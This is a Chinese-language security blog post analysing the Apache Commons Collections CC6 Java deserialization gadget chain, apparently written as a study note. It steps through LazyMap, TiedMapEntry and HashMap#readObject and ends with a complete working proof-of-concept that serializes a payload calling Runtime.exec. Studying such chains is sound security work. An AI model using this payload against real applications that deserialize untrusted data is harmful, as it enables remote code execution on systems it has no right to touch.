+++
title = 'java安全CC6链分析'
date = '2024-07-18T04:09:47+08:00'
categories = ['Java', '安全']
tags = ['cc链', 'java安全']
+++

## 前言

前面已经分析过了cc1链子，但是这个链子有jdk限制，在Java 8u71以后，这个链子就不能再利用了。主要是因为sun.reflect.annotation.AnnotationInvocationHandler#readObject里面逻辑变换了，没有setValue了。

而这篇文章要分析的是最好用的CC链--cc6；因为CC6不受jdk版本的限制，只要commons collections 小于等于3.2.1，都能够利用这条链子。

## 分析

上篇文章的最后我放了两条链子，主要是入口点的不同。分别为TransformedMap和LazyMap，而我们今天要学习的CC6就是利用的LazyMap。

### LazyMap

```java
//org.apache.commons.collections.map.LazyMap#get    
public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }

    // no need to wrap keySet, entrySet or values as they are views of
    // existing map entries - you can't do a map-style get on them.
}
```

可以看到在get方法中调用了transform，但是我们AnnotationInvocationHandler的readObject方法中并没有调用get方法。

我们先执行一下：![image-20240717170845311](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407171708442.png)

那现在就去找哪里调用了get方法。其实解决高版本利用问题，就是找调用了LazyMap#get() 的地⽅。

### TiedMapEntry

而在org.apache.commons.collections.keyvalue.TiedMapEntry#getValue中调用了this.map.get，而在org.apache.commons.collections.keyvalue.TiedMapEntry#hashCode中调用了getValue

```java
public class TiedMapEntry implements Map.Entry, KeyValue, Serializable {
      /** Serialization version */    
    private static final long serialVersionUID = -8453869361373831205L;

    /** The map underlying the entry/iterator */    
    private final Map map;
    /** The key */
    private final Object key;
//......///
  
    public TiedMapEntry(Map map, Object key) {
        super();
        this.map = map;
        this.key = key;
    }    
  
    public int hashCode() {
        Object value = getValue();
        return (getKey() == null ? 0 : getKey().hashCode()) ^
               (value == null ? 0 : value.hashCode()); 
    }
}
```

所以现在就去找哪里调用了hashCode()；在ysoserial中，是利⽤ java.util.HashSet#readObject 到 HashMap#put() 到 HashMap#hash(key) 最后到 TiedMapEntry#hashCode() 。

### HashMap

而其实在java.util.HashMap#readObject就能够调用java.util.HashMap#hash

```java
public class HashMap<K,V> extends AbstractMap<K,V>
    implements Map<K,V>, Cloneable, Serializable {
  
    static final int hash(Object key) {
        int h;
        return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
    }
  //.............//
  
    @java.io.Serial
    private void readObject(ObjectInputStream s)
        throws IOException, ClassNotFoundException {
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
        }
    }
```

到这里我们只需要让key为TiedMapEntry对象就行了

![image-20240717182927092](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407171829197.png)

这里我们构造LazyMap时，传入一个没有危害的facktransformer，这样我们再调试的时候不会出现先触发的问题，然后后边我们再把真正有危害的transformer在序列化之前传入进去。

然后runing，发现并没有什么效果啊。我们调试看一下

![image-20240717184851793](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407171848866.png)

这里map.containsKey(key)为true，所以没进入if。这里看到key被赋值为了key1，但是我们并没用向expmap中赋值啊？看下代码，唯一出现赋值的就是在下面：

![image-20240718092247102](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407180922147.png)

key1出现在TiedMapEntry的构造函数里面，然后我们看为什么最后影响了我们的payload。在第39行expmap.put(tiedMapEntry,"168");的put方法中，其实也调用到了hash(key)：

![image-20240718093208428](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407180932466.png)

这样就导致了我们的链子已经被调用了一遍了，但是由于我们传入的是facktransformer，所以没有执行命令，但是导致我们的payload发生了变化；要解决这个问题，我们只需要将lazymap中的key1移除就好了。

## 完整POC

```java
package top.foreverwl.cc6_v1.ser;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @program: CC6_v1
 * @description:
 * @author: 168
 * @create: 2024-07-17 15:49
 **/
public class Cc6My {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        Transformer[] transformer = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };
        Transformer[] facktransformer=new Transformer[]{new ConstantTransformer(1)};
        ChainedTransformer chainedTransformer = new ChainedTransformer(facktransformer);
        Map nomap=new HashMap();
        Map lazymap= LazyMap.decorate(nomap, chainedTransformer);

        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazymap,"key1");
        HashMap<Object, Object> expmap = new HashMap<>();
        expmap.put(tiedMapEntry,"168");
        lazymap.remove("key1");
        Field f=ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chainedTransformer,transformer);

        serialize(expmap);
        unserialize("ser.txt");

    }
    public static void serialize(Object object) throws IOException {
        FileOutputStream fileOutputStream = new FileOutputStream("ser.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        System.out.println("1.序列化成功");
    }
    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(filename);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println("2.反序列化成功");
    }
}
```

## 总结

前面如果对urldns和cc1分析比较透彻的话，这个链子其实不难。emm还是多看吧，多看多调试。

![image-20240718095729452](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202407180957513.png)
